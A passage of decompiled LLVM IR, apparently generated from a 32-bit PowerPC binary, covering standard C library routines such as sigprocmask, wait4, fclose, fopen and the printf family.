  %v0_10019508 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019508 = inttoptr i32 %v0_10019504 to i32*
  store i32 %v0_10019508, i32* %v2_10019508, align 4
  br label %dec_label_pc_10019510

dec_label_pc_10019510:                            ; preds = %entry, %dec_label_pc_10019504
  %v0_10019520 = phi i32 [ %v0_100194f4, %entry ], [ -1, %dec_label_pc_10019504 ]
  ret i32 %v0_10019520

; uselistorder directives
  uselistorder label %dec_label_pc_10019510, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v3_1001952c = icmp eq i32 %arg2, 0
  br i1 %v3_1001952c, label %dec_label_pc_10019564, label %dec_label_pc_1001954c

dec_label_pc_1001954c:                            ; preds = %entry
  store i32 -1, i32* %r31.global-to-local, align 4
  %tmp5 = icmp ult i32 %arg1, 3
  br i1 %tmp5, label %dec_label_pc_10019564, label %dec_label_pc_10019554

dec_label_pc_10019554:                            ; preds = %dec_label_pc_1001954c
  %v0_10019554 = call i32 @__errno_location()
  %v2_1001955c = inttoptr i32 %v0_10019554 to i32*
  store i32 22, i32* %v2_1001955c, align 4
  %v0_10019588.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10019584

dec_label_pc_10019564:                            ; preds = %dec_label_pc_1001954c, %entry
  %v0_10019568 = call i32 @__asm_mfcr()
  %v1_1001956c = and i32 %v0_10019568, 268435456
  %v3_1001956c = icmp eq i32 %v1_1001956c, 0
  store i32 %v0_10019568, i32* %r31.global-to-local, align 4
  br i1 %v3_1001956c, label %dec_label_pc_10019584, label %dec_label_pc_10019578

dec_label_pc_10019578:                            ; preds = %dec_label_pc_10019564
  %v0_10019578 = call i32 @__errno_location()
  %v0_1001957c = load i32, i32* %r31.global-to-local, align 4
  %v2_1001957c = inttoptr i32 %v0_10019578 to i32*
  store i32 %v0_1001957c, i32* %v2_1001957c, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10019584

dec_label_pc_10019584:                            ; preds = %dec_label_pc_10019564, %dec_label_pc_10019554, %dec_label_pc_10019578
  %v0_10019588 = phi i32 [ %v0_10019568, %dec_label_pc_10019564 ], [ %v0_10019588.pre, %dec_label_pc_10019554 ], [ -1, %dec_label_pc_10019578 ]
  ret i32 %v0_10019588

; uselistorder directives
  uselistorder label %dec_label_pc_10019584, { 2, 0, 1 }
}

define i32 @__libc_sigsuspend(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100195b8 = call i32 @__asm_mfcr()
  %v1_100195bc = and i32 %v0_100195b8, 268435456
  %v3_100195bc = icmp eq i32 %v1_100195bc, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_100195b8, i32* %r31.global-to-local, align 4
  br i1 %v3_100195bc, label %dec_label_pc_100195d4, label %dec_label_pc_100195c8

dec_label_pc_100195c8:                            ; preds = %entry
  %v0_100195c8 = call i32 @__errno_location()
  %v0_100195cc = load i32, i32* %r31.global-to-local, align 4
  %v2_100195cc = inttoptr i32 %v0_100195c8 to i32*
  store i32 %v0_100195cc, i32* %v2_100195cc, align 4
  br label %dec_label_pc_100195d4

dec_label_pc_100195d4:                            ; preds = %entry, %dec_label_pc_100195c8
  %v0_100195e4 = phi i32 [ %v0_100195b8, %entry ], [ -1, %dec_label_pc_100195c8 ]
  ret i32 %v0_100195e4

; uselistorder directives
  uselistorder label %dec_label_pc_100195d4, { 1, 0 }
}

define i32 @__GI_time(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10019600 = call i32 @__asm_mfcr()
  %v1_10019604 = and i32 %v0_10019600, 268435456
  %v3_10019604 = icmp eq i32 %v1_10019604, 0
  store i32 %v0_10019600, i32* %r31.global-to-local, align 4
  br i1 %v3_10019604, label %dec_label_pc_1001961c, label %dec_label_pc_10019610

dec_label_pc_10019610:                            ; preds = %entry
  %v0_10019610 = call i32 @__errno_location()
  %v0_10019614 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019614 = inttoptr i32 %v0_10019610 to i32*
  store i32 %v0_10019614, i32* %v2_10019614, align 4
  br label %dec_label_pc_1001961c

dec_label_pc_1001961c:                            ; preds = %entry, %dec_label_pc_10019610
  %v0_1001962c = phi i32 [ %v0_10019600, %entry ], [ -1, %dec_label_pc_10019610 ]
  ret i32 %v0_1001962c

; uselistorder directives
  uselistorder label %dec_label_pc_1001961c, { 1, 0 }
}

define i32 @__libc_wait(i32 %arg1) local_unnamed_addr {
entry:
  %v4_10019640 = call i32 @wait4(i32 -1, i32 %arg1, i32 0, i32 0)
  ret i32 %v4_10019640
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001965c = call i32 @__asm_mfcr()
  %v1_10019660 = and i32 %v0_1001965c, 268435456
  %v3_10019660 = icmp eq i32 %v1_10019660, 0
  store i32 %v0_1001965c, i32* %r31.global-to-local, align 4
  br i1 %v3_10019660, label %dec_label_pc_10019678, label %dec_label_pc_1001966c

dec_label_pc_1001966c:                            ; preds = %entry
  %v0_1001966c = call i32 @__errno_location()
  %v0_10019670 = load i32, i32* %r31.global-to-local, align 4
  %v2_10019670 = inttoptr i32 %v0_1001966c to i32*
  store i32 %v0_10019670, i32* %v2_10019670, align 4
  br label %dec_label_pc_10019678

dec_label_pc_10019678:                            ; preds = %entry, %dec_label_pc_1001966c
  %v0_10019688 = phi i32 [ %v0_1001965c, %entry ], [ -1, %dec_label_pc_1001966c ]
  ret i32 %v0_10019688

; uselistorder directives
  uselistorder label %dec_label_pc_10019678, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10019690 = load i32, i32* @r4, align 4
  %v2_10019690 = load i32, i32* @r5, align 4
  %v4_10019690 = call i32 @wait4(i32 0, i32 %v1_10019690, i32 %v2_10019690, i32 0)
  ret i32 %v4_10019690
}

define i32 @__libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_100196ac = call i32 @__asm_mfcr()
  %v1_100196b0 = and i32 %v0_100196ac, 268435456
  %v3_100196b0 = icmp eq i32 %v1_100196b0, 0
  store i32 %v0_100196ac, i32* %r31.global-to-local, align 4
  br i1 %v3_100196b0, label %dec_label_pc_100196c8, label %dec_label_pc_100196bc

dec_label_pc_100196bc:                            ; preds = %entry
  %v0_100196bc = call i32 @__errno_location()
  %v0_100196c0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100196c0 = inttoptr i32 %v0_100196bc to i32*
  store i32 %v0_100196c0, i32* %v2_100196c0, align 4
  br label %dec_label_pc_100196c8

dec_label_pc_100196c8:                            ; preds = %entry, %dec_label_pc_100196bc
  %v0_100196d8 = phi i32 [ %v0_100196ac, %entry ], [ -1, %dec_label_pc_100196bc ]
  ret i32 %v0_100196d8

; uselistorder directives
  uselistorder label %dec_label_pc_100196c8, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_100196dc = add i32 %arg1, 128
  %v1_100196e0 = mul i32 %arg1, 2
  %v2_100196e4 = icmp ugt i32 %v1_100196dc, 383
  %v0_100196e8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_100196e4, i32 %v0_100196e8)
  %v3_100196f0 = load i32, i32* inttoptr (i32 268718352 to i32*), align 16
  %v2_100196f4 = add i32 %v1_100196e0, %v3_100196f0
  %v3_100196f4 = inttoptr i32 %v2_100196f4 to i16*
  %v4_100196f4 = load i16, i16* %v3_100196f4, align 2
  %v5_100196f4 = sext i16 %v4_100196f4 to i32
  ret i32 %v5_100196f4
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10019710 = add i32 %tmp, 52
  %v3_10019710 = inttoptr i32 %v2_10019710 to i32*
  %v4_10019710 = load i32, i32* %v3_10019710, align 4
  store i32 %v4_10019710, i32* @r28, align 4
  %v3_10019714 = icmp eq i32 %v4_10019710, 0
  store i1 %v3_10019714, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10019714, label %dec_label_pc_1001971c, label %dec_label_pc_1001973c

dec_label_pc_1001971c:                            ; preds = %entry
  %v2_1001971c = add i32 %tmp, 56
  %v4_10019730 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 268527832, i32 %v2_1001971c)
  store i32 268539708, i32* @lr, align 4
  %v1_10019738 = call i32 @pthread_mutex_lock(i32 %v2_1001971c)
  %v0_1001973c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001973c

dec_label_pc_1001973c:                            ; preds = %entry, %dec_label_pc_1001971c
  %v0_1001974c = phi i32 [ %tmp, %entry ], [ %v0_1001973c.pre, %dec_label_pc_1001971c ]
  %v1_1001973c = inttoptr i32 %v0_1001974c to i16*
  %v2_1001973c = load i16, i16* %v1_1001973c, align 2
  %v3_1001973c = zext i16 %v2_1001973c to i32
  store i32 0, i32* @r27, align 4
  %v1_10019744 = and i32 %v3_1001973c, 64
  store i32 %v1_10019744, i32* %r9.global-to-local, align 4
  %v3_10019744 = icmp eq i32 %v1_10019744, 0
  br i1 %v3_10019744, label %dec_label_pc_10019758, label %dec_label_pc_1001974c

dec_label_pc_1001974c:                            ; preds = %dec_label_pc_1001973c
  store i32 268539732, i32* @lr, align 4
  %v4_10019750 = call i32 @fflush_unlocked(i16* %v1_1001973c, i32 %v1_10019744)
  store i32 %v4_10019750, i32* @r27, align 4
  %v0_10019758.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10019758

dec_label_pc_10019758:                            ; preds = %dec_label_pc_1001973c, %dec_label_pc_1001974c
  %v0_10019758 = phi i32 [ %v0_1001974c, %dec_label_pc_1001973c ], [ %v0_10019758.pre, %dec_label_pc_1001974c ]
  %v1_10019758 = add i32 %v0_10019758, 4
  %v2_10019758 = inttoptr i32 %v1_10019758 to i32*
  %v3_10019758 = load i32, i32* %v2_10019758, align 4
  store i32 268539744, i32* @lr, align 4
  %v1_1001975c = call i32 @__libc_close(i32 %v3_10019758)
  %v3_10019760 = icmp eq i32 %v1_1001975c, 0
  store i1 %v3_10019760, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_1001975c, -1
  br i1 %tmp8, label %dec_label_pc_1001976c, label %dec_label_pc_10019768

dec_label_pc_10019768:                            ; preds = %dec_label_pc_10019758
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1001976c

dec_label_pc_1001976c:                            ; preds = %dec_label_pc_10019758, %dec_label_pc_10019768
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10019774 = load i32, i32* @r31, align 4
  %v2_10019774 = add i32 %v1_10019774, 4
  %v3_10019774 = inttoptr i32 %v2_10019774 to i32*
  store i32 -1, i32* %v3_10019774, align 4
  %v0_10019778 = load i32, i32* %r9.global-to-local, align 4
  %v1_10019778 = add i32 %v0_10019778, 26840
  store i32 %v1_10019778, i32* @r26, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v2_10019780 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_10044d58.1131 to i32), i32* @r29, align 4
  %v4_10019794 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v1_10019778, i32 ptrtoint (i32* @global_var_10044d58.1131 to i32))
  %v0_10019798 = load i32, i32* @r29, align 4
  store i32 268539808, i32* @lr, align 4
  %v1_1001979c = call i32 @pthread_mutex_lock(i32 %v0_10019798)
  %v3_100197a4 = load i32, i32* @global_var_10045218.1132, align 4
  store i32 %v2_10019780, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_100197b0 = add i32 %v3_100197a4, 1
  store i32 %v1_100197b0, i32* %r9.global-to-local, align 4
  store i32 %v1_100197b0, i32* @global_var_10045218.1132, align 4
  store i32 268539836, i32* @lr, align 4
  %v0_100197b8 = call i32 @__pthread_cleanup_pop_restore()
  %v0_100197bc = load i32, i32* @r31, align 4
  %v1_100197bc = inttoptr i32 %v0_100197bc to i16*
  %v2_100197bc = load i16, i16* %v1_100197bc, align 2
  %v3_100197bc = zext i16 %v2_100197bc to i32
  %v0_100197c0 = load i32, i32* @r28, align 4
  %v3_100197c0 = icmp eq i32 %v0_100197c0, 0
  store i1 %v3_100197c0, i1* %cr7_eq.global-to-local, align 1
  %v1_100197c4 = call i32 @__asm_rlwinm(i32 %v3_100197bc, i32 0, i32 17, i32 18)
  %v1_100197cc = or i32 %v1_100197c4, 48
  %v1_100197d0 = trunc i32 %v1_100197cc to i16
  %v2_100197d0 = load i32, i32* @r31, align 4
  %v3_100197d0 = inttoptr i32 %v2_100197d0 to i16*
  store i16 %v1_100197d0, i16* %v3_100197d0, align 2
  %v0_100197d4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100197d4, label %dec_label_pc_100197d8, label %dec_label_pc_100197e4

dec_label_pc_100197d8:                            ; preds = %dec_label_pc_1001976c
  %v2_100197d8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100197d8, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268539876, i32* @lr, align 4
  %v0_100197e0 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_100197e4

dec_label_pc_100197e4:                            ; preds = %dec_label_pc_1001976c, %dec_label_pc_100197d8
  %v0_100197e4 = load i32, i32* @r31, align 4
  %v1_100197e4 = inttoptr i32 %v0_100197e4 to i16*
  %v2_100197e4 = load i16, i16* %v1_100197e4, align 2
  %v3_100197e4 = zext i16 %v2_100197e4 to i32
  %v1_100197e8 = and i32 %v3_100197e4, 16384
  store i32 %v1_100197e8, i32* %r9.global-to-local, align 4
  %v3_100197e8 = icmp eq i32 %v1_100197e8, 0
  br i1 %v3_100197e8, label %dec_label_pc_100197f8, label %dec_label_pc_100197f0

dec_label_pc_100197f0:                            ; preds = %dec_label_pc_100197e4
  %v1_100197f0 = add i32 %v0_100197e4, 8
  %v2_100197f0 = inttoptr i32 %v1_100197f0 to i32*
  %v3_100197f0 = load i32, i32* %v2_100197f0, align 4
  store i32 %v3_100197f0, i32* @r3, align 4
  store i32 268539896, i32* @lr, align 4
  %v0_100197f4 = call i32 @free()
  br label %dec_label_pc_100197f8

dec_label_pc_100197f8:                            ; preds = %dec_label_pc_100197e4, %dec_label_pc_100197f0
  %v0_100197f8 = load i32, i32* @r29, align 4
  %v0_100197fc = load i32, i32* @r26, align 4
  %v4_10019804 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_100197fc, i32 %v0_100197f8)
  %v0_10019808 = load i32, i32* @r29, align 4
  store i32 268539920, i32* @lr, align 4
  %v1_1001980c = call i32 @pthread_mutex_lock(i32 %v0_10019808)
  %v3_10019814 = load i16*, i16** @global_var_1004521c.1133, align 4
  %v4_10019814 = ptrtoint i16* %v3_10019814 to i32
  store i32 %v2_10019780, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_10019820 = add i32 %v4_10019814, 1
  store i32 %v1_10019820, i32* %r9.global-to-local, align 4
  %v4_10019824 = inttoptr i32 %v1_10019820 to i16*
  store i16* %v4_10019824, i16** @global_var_1004521c.1133, align 4
  store i32 ptrtoint (i32* @global_var_1001982c.1134 to i32), i32* @lr, align 4
  %v0_10019828 = call i32 @__pthread_cleanup_pop_restore()
  store i32 268539952, i32* @lr, align 4
  %v0_1001982c = call i32 @_stdio_openlist_dec_use()
  %v0_10019834 = load i32, i32* @r27, align 4
  ret i32 %v0_10019834

; uselistorder directives
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_100197f8, { 1, 0 }
  uselistorder label %dec_label_pc_100197e4, { 1, 0 }
  uselistorder label %dec_label_pc_1001976c, { 1, 0 }
  uselistorder label %dec_label_pc_10019758, { 1, 0 }
  uselistorder label %dec_label_pc_1001973c, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10019850 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10019850
}

define i32 @perror() local_unnamed_addr {
entry:
  %v0_10019854 = load i32, i32* @r3, align 4
  %v3_10019854 = icmp eq i32 %v0_10019854, 0
  br i1 %v3_10019854, label %dec_label_pc_1001987c, label %dec_label_pc_10019864

dec_label_pc_10019864:                            ; preds = %entry
  %v1_10019864 = inttoptr i32 %v0_10019854 to i8*
  %v2_10019864 = load i8, i8* %v1_10019864, align 1
  %v3_10019868 = icmp eq i8 %v2_10019864, 0
  br i1 %v3_10019868, label %dec_label_pc_1001987c, label %dec_label_pc_10019870

dec_label_pc_10019870:                            ; preds = %dec_label_pc_10019864
  br label %dec_label_pc_10019880

dec_label_pc_1001987c:                            ; preds = %dec_label_pc_10019864, %entry
  br label %dec_label_pc_10019880

dec_label_pc_10019880:                            ; preds = %dec_label_pc_10019870, %dec_label_pc_1001987c
  %v3_10019888 = load i32, i32* inttoptr (i32 268718364 to i32*), align 4
  store i32 %v3_10019888, i32* @r3, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1002e3c4.1137 to i32), i32* @r4, align 4
  %v4_10019894 = call i32 @fprintf(i32 %v3_10019888, i32 ptrtoint ([8 x i8]* @global_var_1002e3c4.1137 to i32), i32 268697600)
  ret i32 %v4_10019894

; uselistorder directives
  uselistorder label %dec_label_pc_10019880, { 1, 0 }
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 -1, i32* @r4, align 4
  %v0_100198a4 = call i32 @__GI_vsnprintf()
  ret i32 %v0_100198a4
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_100198b4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100198b4, i32* @r5, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1001990c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1001990c, i32* %stack_var_-96, align 4
  store i32 268540184, i32* @lr, align 4
  %v0_10019914 = call i32 @__GI_vfprintf()
  ret i32 %v0_10019914
}

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r8, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_10019934 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10019934, i32* @r6, align 4
  store i32 3, i32* %stack_var_-104, align 4
  %v2_10019988 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10019988, i32* %stack_var_-96, align 4
  store i32 268540308, i32* @lr, align 4
  %v0_10019990 = call i32 @__GI_vsnprintf()
  ret i32 %v0_10019990
}

define i32 @__GI_asprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r8, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_100199b0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100199b0, i32* @r5, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10019a08 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10019a08, i32* %stack_var_-96, align 4
  store i32 268540436, i32* @lr, align 4
  %v0_10019a10 = call i32 @__GI_vasprintf()
  ret i32 %v0_10019a10
}

define i32 @sprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_10019a44 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10019a44, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10019a94 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10019a94, i32* %stack_var_-96, align 4
  store i32 268540576, i32* @lr, align 4
  %v0_10019a9c = call i32 @__GI_vsnprintf()
  ret i32 %v0_10019a9c
}

define i32 @__GI_vasprintf() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10019abc = ptrtoint i32* %stack_var_-40 to i32
  %v0_10019ac8 = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  store i32 0, i32* @r3, align 4
  store i32 %v2_10019abc, i32* @r6, align 4
  store i32 %v0_10019ac8, i32* @r5, align 4
  store i32 268540656, i32* @lr, align 4
  %v0_10019aec = call i32 @__GI_vsnprintf()
  %v0_10019af0 = load i32, i32* @r27, align 4
  %v1_10019af0 = load i32, i32* @r30, align 4
  %v2_10019af0 = inttoptr i32 %v1_10019af0 to i32*
  store i32 %v0_10019af0, i32* %v2_10019af0, align 4
  store i32 %v0_10019aec, i32* @r31, align 4
  %v1_10019af4 = icmp slt i32 %v0_10019aec, 0
  br i1 %v1_10019af4, label %dec_label_pc_10019b38, label %dec_label_pc_10019afc

dec_label_pc_10019afc:                            ; preds = %entry
  %v1_10019afc = add i32 %v0_10019aec, 1
  store i32 %v1_10019afc, i32* @r3, align 4
  store i32 268540680, i32* @lr, align 4
  %v0_10019b04 = call i32 @malloc()
  store i32 %v0_10019b04, i32* @r3, align 4
  %v0_10019b08 = load i32, i32* @r31, align 4
  store i32 %v0_10019b08, i32* @r4, align 4
  %v3_10019b0c = icmp eq i32 %v0_10019b04, 0
  %v0_10019b10 = load i32, i32* @r29, align 4
  store i32 %v0_10019b10, i32* @r5, align 4
  %v0_10019b14 = load i32, i32* @r28, align 4
  store i32 %v0_10019b14, i32* @r6, align 4
  %v1_10019b18 = load i32, i32* @r30, align 4
  %v2_10019b18 = inttoptr i32 %v1_10019b18 to i32*
  store i32 %v0_10019b04, i32* %v2_10019b18, align 4
  br i1 %v3_10019b0c, label %dec_label_pc_10019b38, label %dec_label_pc_10019b20

dec_label_pc_10019b20:                            ; preds = %dec_label_pc_10019afc
  store i32 268540708, i32* @lr, align 4
  %v0_10019b20 = call i32 @__GI_vsnprintf()
  store i32 %v0_10019b20, i32* @r31, align 4
  %tmp4 = icmp sgt i32 %v0_10019b20, -1
  br i1 %tmp4, label %dec_label_pc_10019b38, label %dec_label_pc_10019b2c

dec_label_pc_10019b2c:                            ; preds = %dec_label_pc_10019b20
  %v0_10019b2c = load i32, i32* @r30, align 4
  %v1_10019b2c = inttoptr i32 %v0_10019b2c to i32*
  %v2_10019b2c = load i32, i32* %v1_10019b2c, align 4
  store i32 %v2_10019b2c, i32* @r3, align 4
  store i32 268540724, i32* @lr, align 4
  %v0_10019b30 = call i32 @free()
  %v0_10019b34 = load i32, i32* @r27, align 4
  %v1_10019b34 = load i32, i32* @r30, align 4
  %v2_10019b34 = inttoptr i32 %v1_10019b34 to i32*
  store i32 %v0_10019b34, i32* %v2_10019b34, align 4
  br label %dec_label_pc_10019b38

dec_label_pc_10019b38:                            ; preds = %dec_label_pc_10019b20, %dec_label_pc_10019afc, %entry, %dec_label_pc_10019b2c
  %v0_10019b3c = load i32, i32* @r31, align 4
  ret i32 %v0_10019b3c

; uselistorder directives
  uselistorder i32 ()* @__GI_vsnprintf, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_10019b38, { 3, 0, 1, 2 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_10019b74 = load i32, i32* @r4, align 4
  store i32 %v0_10019b74, i32* @r27, align 4
  %v0_10019b78 = load i32, i32* @r3, align 4
  %v1_10019b78 = sub i32 -1, %v0_10019b78
  store i32 %v1_10019b78, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_10019b78, i32* %r31.global-to-local, align 4
  %v2_10019b8c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10019b8c, i32* @r3, align 4
  %v0_10019b90 = load i32, i32* @r5, align 4
  store i32 %v0_10019b90, i32* %r29.global-to-local, align 4
  %v0_10019b94 = load i32, i32* @r6, align 4
  store i32 %v0_10019b94, i32* @r28, align 4
  store i32 268540836, i32* @lr, align 4
  %v0_10019ba0 = call i32 @__stdio_init_mutex()
  %v0_10019ba4 = load i32, i32* %r30.global-to-local, align 4
  %v1_10019ba4 = load i32, i32* @r27, align 4
  %v3_10019ba4 = icmp ugt i32 %v0_10019ba4, %v1_10019ba4
  %v0_10019ba8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10019ba8, i32* @r4, align 4
  %v0_10019bac = load i32, i32* @r28, align 4
  store i32 %v0_10019bac, i32* @r5, align 4
  %v2_10019bb0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10019bb0, i32* @r3, align 4
  br i1 %v3_10019ba4, label %dec_label_pc_10019bbc, label %dec_label_pc_10019bc0

dec_label_pc_10019bbc:                            ; preds = %entry
  store i32 %v1_10019ba4, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10019bc0

dec_label_pc_10019bc0:                            ; preds = %entry, %dec_label_pc_10019bbc
  %v1_10019bc0 = phi i32 [ %v0_10019ba4, %entry ], [ %v1_10019ba4, %dec_label_pc_10019bbc ]
  %v0_10019bc0 = load i32, i32* %r31.global-to-local, align 4
  store i32 268540896, i32* @lr, align 4
  %v0_10019bdc = call i32 @_vfprintf_internal()
  %v0_10019be0 = load i32, i32* @r30, align 4
  %v3_10019be0 = icmp eq i32 %v0_10019be0, 0
  br i1 %v3_10019be0, label %dec_label_pc_10019c08, label %dec_label_pc_10019be8

dec_label_pc_10019be8:                            ; preds = %dec_label_pc_10019bc0
  %v1_10019bf0 = add i32 %v0_10019bc0, -1
  store i32 %v1_10019bf0, i32* @r11, align 4
  %v4_10019bf4 = icmp eq i32 %v1_10019bc0, 0
  %v0_10019bfc.v0_10019bc0 = select i1 %v4_10019bf4, i32 %v1_10019bf0, i32 %v0_10019bc0
  %stack_var_-88.0 = inttoptr i32 %v0_10019bfc.v0_10019bc0 to i8*
  %v0_10019c04 = load i32, i32* @r26, align 4
  %v1_10019c04 = trunc i32 %v0_10019c04 to i8
  store i8 %v1_10019c04, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_10019c08

dec_label_pc_10019c08:                            ; preds = %dec_label_pc_10019bc0, %dec_label_pc_10019be8
  ret i32 %v0_10019bdc

; uselistorder directives
  uselistorder i32 %v0_10019b78, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_10019c08, { 1, 0 }
  uselistorder label %dec_label_pc_10019bc0, { 1, 0 }
}

define i32 @pclose(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1004b80c.1138 to i32), i32* %r29.global-to-local, align 4
  %v2_10019c40 = ptrtoint i32* %stack_var_-52 to i32
  %v4_10019c48 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 268527832, i32 ptrtoint (i32* @global_var_1004b80c.1138 to i32))
  store i32 268541012, i32* @lr, align 4
  %v1_10019c50 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004b80c.1138 to i32))
  %v3_10019c58 = load i32, i32* @global_var_10045214.1139, align 4
  store i32 %v3_10019c58, i32* %r29.global-to-local, align 4
  %v3_10019c5c = icmp eq i32 %v3_10019c58, 0
  br i1 %v3_10019c5c, label %dec_label_pc_10019cb8, label %dec_label_pc_10019c64

dec_label_pc_10019c64:                            ; preds = %entry
  %v1_10019c64 = add i32 %v3_10019c58, 4
  %v2_10019c64 = inttoptr i32 %v1_10019c64 to i32*
  %v3_10019c64 = load i32, i32* %v2_10019c64, align 4
  %v1_10019c68 = load i32, i32* @r31, align 4
  %v4_10019c68 = icmp eq i32 %v3_10019c64, %v1_10019c68
  br i1 %v4_10019c68, label %dec_label_pc_10019c70, label %dec_label_pc_10019c94

dec_label_pc_10019c70:                            ; preds = %dec_label_pc_10019c64
  %v1_10019c70 = inttoptr i32 %v3_10019c58 to i32*
  %v2_10019c70 = load i32, i32* %v1_10019c70, align 4
  store i32 %v2_10019c70, i32* @global_var_10045214.1139, align 4
  br label %dec_label_pc_10019cb8

dec_label_pc_10019c7c:                            ; preds = %dec_label_pc_10019c94
  %v0_10019c7c = call i32 @__errno_location()
  %v2_10019c84 = inttoptr i32 %v0_10019c7c to i32*
  store i32 22, i32* %v2_10019c84, align 4
  br label %dec_label_pc_10019cb8

